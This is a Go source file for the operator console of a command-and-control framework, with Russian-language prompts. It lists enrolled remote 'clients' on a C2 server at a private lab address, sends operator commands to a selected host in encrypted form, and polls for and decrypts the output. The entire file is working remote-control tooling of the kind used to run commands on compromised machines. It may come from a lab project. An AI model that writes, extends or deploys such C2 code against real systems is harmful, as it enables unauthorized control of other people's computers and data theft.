package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"c2project/shared"
)

const c2HTTP = "http://192.168.56.104:8080"

func listClients() []shared.ClientInfo {
	resp, err := http.Get(c2HTTP + shared.EndpointList)
	if err != nil {
		log.Printf("[TERM] Ошибка запроса клиентов: %v", err)
		return nil
	}
	defer resp.Body.Close()
	var list []shared.ClientInfo
	json.NewDecoder(resp.Body).Decode(&list)
	return list
}

func submitCommand(clientID, command string) (string, error) {
	encCommand, err := shared.Encrypt(shared.KeyTerminalToC2, []byte(command))
	if err != nil {
		return "", err
	}
	payload := map[string]string{
		"client_id": clientID,
		"command":   base64.StdEncoding.EncodeToString(encCommand),
	}
	body, _ := json.Marshal(payload)
	resp, err := http.Post(c2HTTP+shared.EndpointSubmit, "application/json", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(b))
	}
	var sr shared.SubmitResponse
	json.NewDecoder(resp.Body).Decode(&sr)
	return sr.TaskID, nil
}

func pollStatus(taskID string) (string, string) {
	for {
		time.Sleep(2 * time.Second)
		resp, err := http.Get(c2HTTP + shared.EndpointStatus + "?id=" + taskID)
		if err != nil {
			return shared.StatusError, ""
		}
		var sr shared.StatusResponse
		json.NewDecoder(resp.Body).Decode(&sr)
		resp.Body.Close()
		if sr.Status == shared.StatusDone {
			decoded, err := base64.StdEncoding.DecodeString(sr.Result)
			if err != nil {
				return shared.StatusDone, sr.Result
			}
			plain, err := shared.Decrypt(shared.KeyTerminalToC2, decoded)
			if err != nil {
				return shared.StatusDone, "[decrypt error] " + err.Error()
			}
			return shared.StatusDone, string(plain)
		}
		if sr.Status == shared.StatusError {
			return shared.StatusError, ""
		}
	}
}

func pickClient() string {
	clients := listClients()
	if len(clients) == 0 {
		fmt.Println("[!] Нет зарегистрированных клиентов.")
		return ""
	}
	fmt.Println("Доступные клиенты:")
	for i, c := range clients {
		fmt.Printf("  %d) %s | %s | %s | last seen: %s\n", i+1, c.ClientID, c.Hostname, c.OS, c.LastSeen)
	}
	fmt.Print("Выберите номер клиента: ")
	reader := bufio.NewReader(os.Stdin)
	line, _ := reader.ReadString('\n')
	line = strings.TrimSpace(line)
	var idx int
	fmt.Sscanf(line, "%d", &idx)
	if idx < 1 || idx > len(clients) {
		fmt.Println("[!] Неверный номер")
		return ""
	}
	return clients[idx-1].ClientID
}

func main() {
	setConsoleUTF8()
	fmt.Println("=== C2 Terminal ===")
	clientID := ""
	for {
		fmt.Println("\nКоманды: /clients — выбрать клиента, /exit — выход")
		fmt.Print("> ")
		reader := bufio.NewReader(os.Stdin)
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "/exit" {
			return
		}
		if line == "/clients" {
			clientID = pickClient()
			continue
		}
		if clientID == "" {
			fmt.Println("[!] Сначала выберите клиента через /clients")
			continue
		}

		taskID, err := submitCommand(clientID, line)
		if err != nil {
			fmt.Printf("[!] Ошибка отправки: %v\n", err)
			continue
		}
		fmt.Printf("[*] Задача %s отправлена, ожидание результата...\n", taskID)
		status, result := pollStatus(taskID)
		if status == shared.StatusDone {
			fmt.Println("--- Результат ---")
			fmt.Println(result)
			fmt.Println("-----------------")
		} else {
			fmt.Println("[!] Ошибка выполнения")
		}
	}
}